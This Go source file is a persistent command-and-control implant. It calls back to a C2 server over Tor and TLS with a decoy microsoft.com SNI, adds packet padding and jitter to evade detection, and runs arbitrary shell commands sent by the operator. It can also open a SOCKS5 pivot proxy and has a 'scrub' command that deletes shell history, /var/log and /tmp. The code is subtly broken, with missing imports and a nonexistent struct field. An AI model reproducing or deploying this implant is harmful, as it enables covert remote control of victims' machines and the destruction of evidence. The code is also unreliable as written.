package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"

	"golang.org/x/net/proxy"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"io"
)

var sharedKeyString string // Injected via ldflags
var sharedKey []byte

func init() {
	sharedKey = []byte(sharedKeyString)
}

func encrypt(data []byte) string {
	// Pad buffer to normalize packet size and evade heuristic analysis
	padSize := 256 - (len(data) % 256)
	padding := make([]byte, padSize)
	rand.Read(padding)
	
	payload := append(data, '|' )
	payload = append(payload, padding...)

	block, _ := aes.NewCipher(sharedKey)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	ct := gcm.Seal(nonce, nonce, payload, nil)
	return base64.StdEncoding.EncodeToString(ct)
}

func decrypt(data string) []byte {
	raw, _ := base64.StdEncoding.DecodeString(data)
	block, _ := aes.NewCipher(sharedKey)
	gcm, _ := cipher.NewGCM(block)
	nonceSize := gcm.NonceSize()
	nonce, ct := raw[:nonceSize], raw[nonceSize:]
	out, _ := gcm.Open(nil, nonce, ct, nil)
	return out
}

// Enterprise Shadow Node Agent — Persistent C2 Callback.

type Command struct {
	Type    string `json:"type"`
	Cmd     string `json:"cmd,omitempty"`
	Payload string `json:"payload,omitempty"`
	Port    int    `json:"port,omitempty"`
}

type Packet struct {
	Type        string `json:"type"`
	Nick        string `json:"nick"`
	Fingerprint string `json:"fp"`
	OS          string `json:"os"`
	Hostname    string `json:"host"`
	Output      string `json:"output,omitempty"`
}

func getShadowID() string {
	// Generate hardware-linked operational identifier
	host, _ := os.Hostname()
	h := sha256.New()
	h.Write([]byte(host + runtime.GOARCH + runtime.GOOS))
	return hex.EncodeToString(h.Sum(nil))[:16]
}

func main() {
	fmt.Println("[*] Agent operational. Initiating secure communications...")
	// Configuration
	var c2Encoded string // Injected via ldflags
	server := "127.0.0.1:44444" 
	if c2Encoded != "" {
		decoded, err := base64.StdEncoding.DecodeString(c2Encoded)
		if err == nil {
			server = string(decoded)
		}
	}
	torProxy := "127.0.0.1:9050" 

	if len(os.Args) > 1 {
		server = os.Args[1]
	}

	fp := getShadowID()
	host := "diagnostic-node" // Masked hostname

	for {
		// Add randomized execution delay to evade traffic pattern analysis
		jitter := time.Duration(rand.Intn(30)) * time.Second
		time.Sleep(jitter)

		var conn net.Conn
		var err error

		// Initialize Tor proxy routing
		dialer, proxyErr := proxy.SOCKS5("tcp", torProxy, nil, proxy.Direct)
		
		// TLS Config for Masquerading (Look like a normal web request)
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true, // For self-signed Shadow-Plane certs
			ServerName:         "microsoft.com", // SNI Masquerading decoy
		}

		if proxyErr == nil {
			rawConn, proxyDialErr := dialer.Dial("tcp", server)
			if proxyDialErr == nil {
				conn = tls.Client(rawConn, tlsConfig)
			}
		}
		
		if conn == nil {
			// Fallback to direct TLS if Tor fails
			conn, err = tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp", server, tlsConfig)
		}

		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}
		fmt.Printf("[*] C2_LINK_ESTABLISHED: Established link to %s\n", server)

		// Initial Check-in (Handshake with Challenge)
		challenge := make([]byte, 32)
		io.ReadFull(rand.Reader, challenge)
		
		checkin := Packet{
			Type:        "ghost_checkin",
			Nick:        fmt.Sprintf("Agent_%s", fp[:8]),
			Fingerprint: fp,
			OS:          runtime.GOOS,
			Hostname:    host,
			Payload:     base64.StdEncoding.EncodeToString(challenge),
		}
		checkinBytes, _ := json.Marshal(checkin)
		conn.Write([]byte(encrypt(checkinBytes) + "\n"))

		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			line := scanner.Text()
			if line == "" { continue }
			
			// Attempt to decrypt
			decrypted := decrypt(line)
			if decrypted == nil {
				fmt.Printf("[DEBUG] Decryption failed for line: %s\n", line)
				decrypted = []byte(line)
			} else {
				fmt.Printf("[DEBUG] Decrypted: %s\n", string(decrypted))
			}

			var cmd Command
			if err := json.Unmarshal(decrypted, &cmd); err == nil {
				if cmd.Type == "execute" {
					os.Setenv("HISTFILE", "/dev/null")
					out, err := exec.Command("sh", "-c", cmd.Cmd).CombinedOutput()
					if err != nil {
						out = []byte(fmt.Sprintf("ERROR: %v", err))
					}
					// Return encrypted output
					response := Packet{
						Type:   "ghost_output",
						Nick:   checkin.Nick,
						Output: string(out),
					}
					respBytes, _ := json.Marshal(response)
					conn.Write([]byte(encrypt(respBytes) + "\n"))
				} else if cmd.Type == "proxy" {
					// Launch ephemeral SOCKS5 proxy on requested port
					go startTacticalProxy(cmd.Port)
					response := Packet{
						Type:   "ghost_output",
						Nick:   checkin.Nick,
						Output: fmt.Sprintf("[+] PROXY_ESTABLISHED: SOCKS5 Active on port %d", cmd.Port),
					}
					respBytes, _ := json.Marshal(response)
					conn.Write([]byte(encrypt(respBytes) + "\n"))
				} else if cmd.Type == "scrub" {
					// Securely wipe operational history and log artifacts
					exec.Command("sh", "-c", "rm -rf ~/.bash_history ~/.zsh_history /var/log/* /tmp/*").Run()
					exec.Command("sh", "-c", "history -c").Run()
					response := Packet{
						Type:   "ghost_output",
						Nick:   checkin.Nick,
						Output: "[+] FORENSIC_SCRUB_COMPLETE: All operational traces purged.",
					}
					respBytes, _ := json.Marshal(response)
					conn.Write([]byte(encrypt(respBytes) + "\n"))
				}
			}
		}
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

func startTacticalProxy(port int) {
	l, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil { return }
	defer l.Close()
	for {
		c, err := l.Accept()
		if err != nil { return }
		go handleProxyConn(c)
	}
}

func handleProxyConn(c net.Conn) {
	// Simple SOCKS5 Handshake (V5, No Auth)
	buf := make([]byte, 256)
	_, err := io.ReadFull(c, buf[:2])
	if err != nil || buf[0] != 0x05 { c.Close(); return }
	n := int(buf[1])
	io.ReadFull(c, buf[:n])
	c.Write([]byte{0x05, 0x00}) // No Auth

	// Connect Request
	io.ReadFull(c, buf[:4])
	if buf[1] != 0x01 { c.Close(); return } // Only CONNECT supported

	var addr string
	switch buf[3] {
	case 0x01: // IPv4
		io.ReadFull(c, buf[:4])
		addr = net.IP(buf[:4]).String()
	case 0x03: // Domain
		io.ReadFull(c, buf[:1])
		sz := int(buf[0])
		io.ReadFull(c, buf[:sz])
		addr = string(buf[:sz])
	}
	io.ReadFull(c, buf[:2])
	p := (int(buf[0]) << 8) | int(buf[1])
	target := fmt.Sprintf("%s:%d", addr, p)

	remote, err := net.Dial("tcp", target)
	if err != nil {
		c.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		c.Close()
		return
	}
	c.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
	go io.Copy(remote, c)
	io.Copy(c, remote)
	remote.Close()
	c.Close()
}
